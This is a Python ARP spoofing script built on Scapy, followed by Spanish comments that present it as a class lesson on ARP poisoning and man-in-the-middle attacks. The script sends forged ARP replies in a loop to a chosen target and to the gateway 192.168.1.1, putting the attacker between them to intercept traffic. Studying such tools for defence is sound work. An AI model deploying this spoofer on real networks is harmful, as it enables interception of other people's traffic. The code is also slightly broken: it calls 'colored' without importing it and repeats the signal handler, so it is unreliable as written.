#!/usr/bin/env python3

import argparse
import scapy.all as scapy
import time
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"\nSaliendo del programa..", 'red'))
    sys.exit(1)
#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to spoof")

    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
    scapy.send(arp_packet, verbose=False)

def main():
    arguments = get_arguments()

    while True:
        spoof(arguments.ip_address, "192.168.1.1")
        spoof("192.168.1.1", arguments.ip_address)

        time.sleep(2)

if __name__ == '__main__':
    main()


def def_handler(sig, frame):
    print(colored(f"\nSaliendo del programa..", 'red'))
    sys.exit(1)
#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#En esta clase, nos centraremos en la creación de un envenenador ARP (ARP Spoofer) utilizando Scapy, una herramienta esencial de Python para el análisis y manipulación de paquetes de red. El ARP Spoofing es una técnica de ataque en redes donde un atacante envía mensajes ARP falsificados en una red local. Esto se hace para asociar la dirección MAC del atacante con la dirección IP de otro dispositivo, como un servidor o un gateway, lo que permite al atacante interceptar el tráfico entre dos sistemas.

#El concepto de Man-In-The-Middle (MITM) es crucial aquí, ya que el atacante se posiciona estratégicamente entre dos partes para interceptar o modificar el tráfico de datos, una táctica común en ataques cibernéticos. Esta técnica es posible debido a la naturaleza de confianza del protocolo ARP, que no verifica si las respuestas a las solicitudes ARP son legítimas.

#Durante la clase, exploraremos cómo Scapy puede ser utilizado para implementar este tipo de ataque, proporcionando una comprensión profunda de cómo funciona el ARP Spoofing y por qué es una amenaza significativa en las redes. Esta experiencia práctica te dotará de las habilidades necesarias para identificar y prevenir estos ataques en entornos reales, fortaleciendo tu comprensión y habilidades en ciberseguridad.
